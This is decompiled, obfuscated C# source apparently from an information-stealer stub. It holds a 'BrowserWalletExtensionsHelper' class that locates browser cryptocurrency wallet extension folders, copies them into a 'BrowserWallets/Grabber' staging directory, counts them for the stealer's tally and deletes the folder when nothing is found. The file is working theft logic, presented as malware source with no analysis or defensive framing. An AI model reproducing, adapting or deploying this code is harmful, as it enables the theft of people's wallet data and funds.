using System;
using System.Collections.Generic;
using System.IO;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000013 RID: 19
	internal sealed class BrowserWalletExtensionsHelper
	{
		// Token: 0x0600004F RID: 79 RVA: 0x00007F50 File Offset: 0x00006150
		public static void GetWallets(string saveDirectory, Dictionary<string, string> walletsDirectories, string baseBrowserPath, string browserName)
		{
			try
			{
				saveDirectory = Path.Combine(Paths.InitWorkDir(), "BrowserWallets", "Grabber");
				Directory.CreateDirectory(saveDirectory);
				int num = 0;
				foreach (KeyValuePair<string, string> keyValuePair in walletsDirectories)
				{
					string text = Path.Combine(baseBrowserPath, keyValuePair.Value);
					num += (BrowserWalletExtensionsHelper.CopyWalletFromDirectoryTo(saveDirectory, text, keyValuePair.Key) ? 1 : 0);
				}
				if (num == 0 && Directory.Exists(saveDirectory))
				{
					Filemanager.RecursiveDelete(saveDirectory);
					Console.WriteLine("No wallets found in " + browserName + " extensions.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error getting wallets for " + browserName + ": " + ex.Message);
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00008034 File Offset: 0x00006234
		private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
		{
			bool flag;
			try
			{
				if (!Directory.Exists(walletDirectory))
				{
					flag = false;
				}
				else
				{
					string text = Path.Combine(saveDirectory, walletName, Path.GetFileName(walletDirectory));
					Directory.CreateDirectory(text);
					Filemanager.CopyDirectory(walletDirectory, text);
					Counter.BrowserWallets++;
					Console.WriteLine("Copied wallet: " + walletName + " to " + text);
					flag = true;
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error copying wallet " + walletName + ": " + ex.Message);
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000038B4 File Offset: 0x00001AB4
		public BrowserWalletExtensionsHelper()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000038AD File Offset: 0x00001AAD
		static BrowserWalletExtensionsHelper()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
